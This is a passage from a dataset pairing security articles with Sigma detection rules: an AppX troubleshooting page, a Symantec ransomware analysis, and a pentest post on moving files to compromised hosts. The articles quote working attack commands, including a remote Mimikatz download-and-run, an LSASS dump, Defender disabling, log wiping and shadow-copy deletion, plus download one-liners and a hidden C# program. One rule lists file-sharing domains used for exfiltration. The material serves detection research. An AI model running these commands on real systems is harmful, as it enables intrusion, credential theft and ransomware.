**APPX_E_INVALID_**  <br>**SIP_CLIENT_DATA**                                                           | 0x80080209 | The [**SIP_SUBJECTINFO**](/en-us/windows/win32/api/mssip/ns-mssip-sip_subjectinfo)structure used to sign the package didn't contain the required data|\n| **APPX_E_INVALID_**  <br>**KEY_INFO**                                                                  | 0x8008020A | The [**APPX_KEY_INFO**](/en-us/windows/win32/api/appxpackaging/ns-appxpackaging-appx_key_info) structure used to encrypt or decrypt the package contains invalid data|\n| **APPX_E_INVALID_**  <br>**CONTENTGROUPMAP**                                                           | 0x8008020B | The .msix/.appx package's content group map is invalid|\n| **APPX_E_INVALID_**  <br>**APPINSTALLER**                                                              | 0x8008020C | The [.appinstaller file](/en-us/windows/msix/app-installer/app-installer-root) for the package is invalid|\n| **APPX_E_DELTA_BASELINE_**  <br>**VERSION_MISMATCH**                                                   | 0x8008020D | The baseline package version in delta package does not match the version in the baseline package to be updated|\n| **APPX_E_DELTA_PACKAGE_**  <br>**MISSING_FILE**                                                        | 0x8008020E | The delta package is missing a file from the updated package|\n| **APPX_E_INVALID_**  <br>**DELTA_PACKAGE**                                                             | 0x8008020F | The delta package is invalid|\n| **APPX_E_DELTA_APPENDED_**  <br>**PACKAGE_NOT_ALLOWED**                                                | 0x80080210 | The delta appended package is not allowed for the current operation|\n| **APPX_E_INVALID_**  <br>**PACKAGING_LAYOUT**                                                          | 0x80080211 | The packaging layout file is invalid|\n| **APPX_E_INVALID_**  <br>**PACKAGESIGNCONFIG**                                                         | 0x80080212 | The packageSignConfig file is invalid|\n| **APPX_E_RESOURCESPRI_**  <br>**NOT_ALLOWED**                                                          | 0x80080213 | The resources.pri file is not allowed when there are no resource elements in the package manifest|\n| **APPX_E_FILE_**  <br>**COMPRESSION_MISMATCH**                                                         | 0x80080214 | The compression state of file in baseline and updated package does not match|\n| **APPX_E_INVALID_**  <br>**PAYLOAD_PACKAGE_EXTENSION**                                                 | 0x80080215 | Non .appx extensions are not allowed for payload packages targeting older platforms|\n| **APPX_E_INVALID_**  <br>**ENCRYPTION_EXCLUSION_FILE_LIST**                                            | 0x80080216 | The encryptionExclusionFileList file is invalid|\n\n## Applications don't start and their names are dimmed\n\nOn a computer running Windows 10 or later, you can't start some applications, and the application names appear dimmed.\n\n```image\nAlt: Some application names appear dimmed in the Start menu\nDescription: The image depicts a Windows Start menu containing a list of applications, some of which are dimmed. The highlighted application names include '7-Zip', 'Access 2016', 'Acrobat Distiller 6.0', 'Acrobat Reader DC', and 'Adobe Acrobat 6.0 Standard'. The dimmed appearance indicates that these applications may not be functioning properly, aligning with the troubleshooting context provided, which discusses issues related to application startup and error messages associated with certain Windows apps.\nTranscription: |\n  #\n  7-Zip\n  A\n  Access 2016\n  Acrobat Distiller 6.0\n  Acrobat Reader DC\n  Adobe Acrobat 6.0 Standard\n```\n\nWhen you try to open an application by selecting the dimmed name, you may receive one of the following error messages:\n\n> There's a problem with <em>application name</em>. Contact your system administrator about repairing or reinstalling it\n> Error: This app can't open\n\nAdditionally, the following event entries are logged in the \"Microsoft-Windows-TWinUI/Operational\" log under **Applications and Services\\Microsoft\\Windows\\Apps**:\n\n> Log Name: Microsoft-Windows-TWinUI/Operational\n> Source: Microsoft-Windows-Immersive-Shell\n> Date: <em>date</em>\n> Event ID: 5960\n> Task Category: (5960)\n> Level: Error\n> Keywords:\n> Description:\n> Activation of the app Microsoft.BingNews_8wekyb3d8bbwe!AppexNews for the Windows. Launch contract was blocked with error 0x80073CFC because its package is in state: Modified.\n\n### Cause\n\nThis issue occurs because the registry entry for the status value of application's corresponding package was modified.\n\n### Resolution\n\n> **Warning**\n> Serious problems might occur if you modify the registry incorrectly by using Registry Editor or by using another method. These problems might require that you reinstall the operating system. Microsoft cannot guarantee that these problems can be solved. Modify the registry at your own risk.\n\nTo fix this issue:\n\n1. Start Registry Editor, and then locate the **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList** subkey.\n2. To back up the subkey data, right-click **PackageList**, select **Export**, and then save the data as a registry file.\n3. For each of the applications that are listed in the Event ID 5960 log entries, follow these steps:\n   1. Locate the **PackageStatus** entry.\n   2. Set the value of **PackageStatus** to zero (**0**).\n\n   > **Note**\n   > If there are no entries for the application under **PackageList**, then the issue has some other cause. In the case of the example event in this article, the full subkey is **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList\\Microsoft.BingNews_8wekyb3d8bbwe!AppexNews\\PackageStatus**.\n\n4. Restart the computer.\n\n## Get additional help\n\nIf you need further help with resolving a problem you are experiencing when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer, refer to these additional developer support resources.\n\n- Microsoft Q&A offers relevant and timely answers to your technical problems from a community of experts and Microsoft engineers.\n- For community assistance with development questions, there are our forums, and StackOverflow.\n- The Windows developer support site explains other support options.\n\n## Related topics\n\n- How to sign an app package using SignTool\n- How to troubleshoot app package signature errors",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml",
    "id": "713"
  },
  {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
    "markdown": "# Ransomware: How Attackers are Breaching Corporate Networks\n\n## Latest tools, tactics, and procedures being used by the Hive, Conti, and AvosLocker ransomware operations.\n\nTargeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness.\n\nSymantec, a division of Broadcom Software, tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks:\n\n- Hive\n- Conti\n- Avoslocker\n\nSimilar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators.\n\nOnce initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following:\n\n- Gain persistence on the network\n- Escalate privileges\n- Tamper with and evade security software\n- Laterally move across the network\n\n### Initial Access\n\nAffiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include:\n\n- Spear phishing leading to the deployment of malware, including but not limited to:\n  - IcedID\n  - Emotet\n  - QakBot\n  - TrickBot\n- Taking advantage of weak RDP credentials\n- Exploiting vulnerabilities such as:\n  - Microsoft Exchange vulnerabilities - CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-26855\n  - FortiGate firewall vulnerabilities - CVE-2018-13379 and CVE-2018-13374\n  - Apache Log4j vulnerability - CVE-2021-44228\n\nIn most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers.\n\n### Persistence\n\nAfter gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall:\n\n```\nnetsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes\n```\n\nActors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted:\n\n```\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f\n```\n\n### Discovery\n\nDuring the discovery phase the ransomware actors try to sweep the victim’s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following:\n\n- ADRecon - Gathers Active Directory information and generates a report\n- Netscan - Discovers devices on the network\n\n### Credential Access\n\nMimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories:\n\n```\npowershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds\n```\n\nIn addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory:\n\n```\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full\n```\n\nAdversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials.\n\n### Lateral Movement\n\nAttackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks.\n\n- PsExec\n```\npsexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe\n```\n\n- WMI\n```\nwmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\"\n```\n\n- BITSAdmin\n```\nbitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll\n```\n\n- Mimikatz\n```\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\"\n```\n\n### Defense Evasion\n\nAs with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sc commands to disable or terminate them. In some cases they also use tools like PC Hunter to end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative.\n\nBoth Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands.\n\n**AvosLocker:**\n```\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n```\n\n**Hive:**\n```\nreg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\nreg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v “Windows Defender” /f\nreg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows Defender” /\n```\n\nDisabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families:\n\n```\nnetsh advfirewall set allprofiles state off\n```\n\nTo cover their tracks on a victim system the actors may also clear the Windows event log:\n\n```\nwevtutil.exe cl system\nwevtutil.exe cl security\nwevtutil.exe cl application\npowershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\"\n```\n\n### Impact\n\nAdversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands:\n\n```\nvssadmin.exe delete shadows /all /quiet\nwmic.exe shadowcopy delete\n```\n\nWe have also seen BCDEdit being used to disable automatic system recovery and to ignore failures on boot:\n\n```\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n```\n\nIn some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode:\n\n```\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f\n```\n\n### Exfiltration\n\nAttackers commonly exfiltrate critical data from a victim’s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data:\n\n- https://anonfiles.com\n- https://mega.nz\n- https://send.exploit.in\n- https://ufile.io\n- https://www.sendspace.com\n\nWe have also seen attackers use the following tools for data exfiltration:\n\n- Filezilla\n- Rclone\n\n### Conclusion\n\nThe TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach.\n\n### Symantec Protection\n\nSymantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies.\n\n#### AV Protection\n\n- Ransom.Hive\n- Ransom.Conti\n- Ransom.AvosLocker\n- Backdoor.Cobalt\n- Hacktool.Mimikatz\n- Trojan.IcedID*\n- Trojan.Emotet*\n- W32.Qakbot*\n- Trojan.Trickybot*\n\n#### Behavioral Protection\n\n- SONAR.RansomHive!g2\n- SONAR.RansomHive!g3\n- SONAR.RansomHive!g4\n- SONAR.RansomAvos!g2\n- SONAR.RansomConti!g1\n- SONAR.RansomConti!g3\n- SONAR.RansomConti!g4\n- SONAR.Ransomware!g30\n- SONAR.RansomGregor!g1\n- SONAR.SuspLaunch!gen4\n- SONAR.SuspLaunch!g18\n- SONAR.Ransom!gen59\n- SONAR.Ransomware!g26\n- SONAR.Cryptlck!g171\n\n#### Intrusion Prevention System (IPS) detections\n\nIPS blocks initial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic.\n\nThe following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec.\n\n- [33211 [Audit: AnyDesk Remote Desktop Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33211)\n- [33156 [Audit: ScreenConnect Remote Support Software Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33156)\n- [30068 [Audit: PSExec Utility Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=30068)\n- [33588 [Audit: WMIC Remote RPC Interface Bind Attempt]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33588)\n- [33311 [Audit: PCHunter Tool Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33331)\n- [33295 [Attack: Ransom.Conti Activity 3]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33295)\n- [33435 [Attack: Ransom.AvosLocker Activity 3]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33435)\n- [33444 [Attack: Ransom.AvosLocker Activity 4]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33444)\n- [32436 [Attack: Ransom.Gen Activity 29]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=32436)\n- [33323 [Attack: Ransom.Hive Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33323)\n- [33119 [Audit: RClone Tool Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33119)\n\nSymantec recommends that you have intrusion prevention enabled on all your devices including servers.\n\n#### Adaptive Protection\n\nSymantec Adaptive Protection can help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should “Deny” these applications and actions using Symantec Adaptive Protection policies.",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml",
    "id": "719"
  },
  {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File\n\n**Network Pentesting | June 16, 2014**\n\n---\n\nPentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files.\n\nThere are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is a summary of the file transfer techniques that will be covered in this blog.\n\n1. PowerShell file download\n2. Visual Basic file download\n3. Perl file download\n4. Python file download\n5. Ruby file download\n6. PHP file download or upload\n7. FTP file download\n8. TFTP file download\n9. Bitsadmin file download\n10. Wget file download\n11. Netcat file download\n12. Windows share file download\n13. Notepad dialog box file download\n14. Exe to Text, Text to EXE with PowerShell and Nishang\n15. Csc.exe to compile from source file\n\n**Note:** Many of the techniques listed should also be considered as options when executing commands through SQL injection. For the multi-line steps, ECHO the commands to a file, and then execute the file.\n\n### 1. PowerShell File Download\n\nPowerShell is one of those scripting languages that can be overlooked as a threat by administrators. However, it can provide a plethora of options and capabilities to someone who knows how to use it. The biggest benefit is that it is native to Windows since Windows Server 2003. Below is an example of a simple script that can be used to download a file to the local file system from a webserver on the internet:\n\n```\n$p = New-Object System.Net.WebClient\n$p.DownloadFile(\"https://domain/file\", \"C:%homepath%file\")\n```\n\nTo execute this script, run the following command in a PowerShell window:\n\n```\nPS C:\\> .\\test.ps1\n```\n\nSometimes, the PowerShell execution policy is set to restricted. In this case, you will not be able to execute commands or scripts through PowerShell… unless you just set it to unrestricted using the following command:\n\n```\nC:\\> powershell set-executionpolicy unrestricted\n```\n\n### 2. Visual Basic File Download\n\nThe final version of Visual Basic has come standard on Windows machines since 1998. The following script can download a file of your choosing. However, the script is quite larger than the PowerShell one.\n\n```\nSet args = Wscript.Arguments\nUrl = \"https://domain/file\"\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", Url, False\nxHttp.Send\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile \"C:%homepath%file\", 2\nend with\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nC:\\> cscript test.vbs\n```\n\n### 3. Perl File Download\n\nPerl is an extremely versatile scripting language that can be used for almost anything. Using Perl makes it super easy to download files onto the local host.\n\n```\n#!/usr/bin/perl\nuse LWP::Simple;\ngetstore(\"https://domain/file\", \"file\");\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# perl test.pl\n```\n\n### 4. Python File Download\n\nPython is a general purpose scripting language that emphasizes code readability. As with most scripting languages, the goal is to write less code than needed for a programming language, while still accomplishing the intended task.\n\n```\n#!/usr/bin/python\nimport urllib2\nu = urllib2.urlopen('https://domain/file')\nlocalFile = open('local_file', 'w')\nlocalFile.write(u.read())\nlocalFile.close()\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# python test.py\n```\n\n### 5. Ruby File Download\n\nRuby is an object-oriented programming language that can be used for many things from creating frameworks (think Metasploit) to simple tasks such as downloading files.\n\n```\n#!/usr/bin/ruby\nrequire 'net/http'\nNet::HTTP.start(\"www.domain.com\") do |http|\n    r = http.get(\"/file\")\n    open(\"save_location\", \"wb\") do |file|\n        file.write(r.body)\n    end\nend\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# ruby test.rb\n```\n\n### 6. PHP File Download\n\nPHP is usually a server-side scripting language used for web development, but can also be used as a general purpose scripting language.\n\n```\n#!/usr/bin/php\n<?php\n$data = @file(\"https://example.com/file\");\n$lf = \"local_file\";\n$fh = fopen($lf, 'w');\nfwrite($fh, $data[0]);\nfclose($fh);\n?>\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# php test.php\n```\n\n### 7. FTP File Download\n\nFor this method, an attacker would want to echo the FTP commands to a bash script since it generally requires user interaction to input a username and password. This bash script can then be run to have all the steps ran without the need for interaction.\n\n```\nftp 127.0.0.1 username password get file exit\n```\n\n### 8. TFTP File Download\n\nTrivial FTP comes by default in Windows Vista and below. Note that you will have to set up the corresponding server to connect to. It can be run using the following command:\n\n```\ntftp -i host GET C:%homepath%file location_of_file_on_tftp_server\n```\n\n### 9. Bitsadmin File Download\n\nBitsadmin is a command-line tool for windows that allows a user to create download or upload tasks.\n\n```\nbitsadmin /transfer n https://domain/file c:%homepath%file\n```\n\n### 10. Wget File Download\n\nWget is a Linux and Windows tool that allows for non-interactive downloads.\n\n```\nwget https://example.com/file\n```\n\n### 11. Netcat File Download\n\nNetcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection. Note that this example is Linux specific.\n\nOn the attacker's computer, type:\n\n```\ncat file | nc -l 1234\n```\n\nThis will print the contents of the file to the local port 1234. Then, whenever someone connects to that port, the contents of the file will be sent to the connecting IP.\n\nThe following command should be run on the machine the attacker is targeting:\n\n```\nnc host_ip 1234 > file\n```\n\n### 12. Windows Share File Download\n\nWindows shares can be mounted to a drive letter, and files can then be copied over by subsequent copy commands.\n\nTo mount a remote drive, type:\n\n```\nnet use x: \\\\127.0.0.1\\share /user:example.com\\userID myPassword\n```\n\n### 13. Notepad Dialog Box File Download\n\nIf you have access (RDP, physical, etc.) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention (UNC) path. This also works well when you are breaking out of a locked-down application being run on a terminal.\n\n1. Open notepad\n2. Go to file – open\n3. In the File Name box near the bottom, type in the full URL path to your file\n\n```image\nAlt: Rg Download File\nDescription: The image displays a Notepad dialog box on a Windows operating system. It shows the 'Open' file dialog with the path field populated by a URL: 'http://en.wikipedia.org/robots.txt'. The dialog box is framed with red lines, highlighting the area where the URL is entered. The interface indicates that this method can be used to download a file when user permissions restrict access to a web browser.\nTranscription: |\n  Untitled - Notepad\n  \n  Open\n  Computer  Local Disk (C:)\n  \n  Organize  New folder\n  \n  Name\n  Date modified\n  Type\n  Size\n  \n  File name: http://en.wikipedia.org/robots.txt\n  \n  Text Documents (*.txt)\n  Encoding: ANSI\n  \n  [Open] [Cancel]\n```\n\nNotepad is kind enough to go out and grab the contents of this file for you.\n\n### 14. Exe to Txt, and Txt to Exe with PowerShell and Nishang\n\nThis is possibly one of my favorite tools to use when trying to move an exe to a machine. Nishang allows you to convert an exe to hex, then reassemble the hex into the original exe using PowerShell. I have seen group policies that do not allow for the transfer of exes through the RDP clipboard. Although it provides basic protection, it (sometimes) still allows the ability to copy text through the clipboard. In this scenario, you would be able to copy across the Nishang PowerShell source to a file on the box and rename the extension to .ps1. The Nishang script you want to copy is TexttoExe.ps1, and it is only 8 lines long. You can download Nishang here.\n\nTo convert the exe to a hex file, type:\n\n```\nPS > .\\ExetoText.ps1 evil.exe evil.txt\n```\n\nOpen the evil.txt file and copy the contents. Then paste the contents to the target machine using the RDP clipboard. Do the same with the contents of the TexttoExe.ps1 file in Nishang.\n\nTo convert the hex file back to an exe, type:\n\n```\nPS > .\\TexttoExe.ps1 evil.txt evil.exe\n```\n\nThis will result in your evil exe being successfully moved to the target machine.\n\n### 15. Csc.exe to Compile Source from a File\n\nC sharp compiler (csc) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.\n\nThe default location for this executable is the following:\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\version\n```\n\nUsing the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:\\Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.\n\n```\npublic class Evil {\n    public static void Main() {\n        System.Diagnostics.Process process = new System.Diagnostics.Process();\n        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n        startInfo.FileName = \"cmd.exe\";\n        startInfo.Arguments = \"/C net users > C:\\\\Temp\\\\users.txt\";\n        process.StartInfo = startInfo;\n        process.Start();\n    }\n}\n```\n\nTo compile your source code, type:\n\n```\ncsc.exe /out:C:\\evil.exe C:\\evil.cs\n```\n\n---\n\nHopefully this blog has given you viable options for getting your files (malicious or otherwise) over to a server.",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
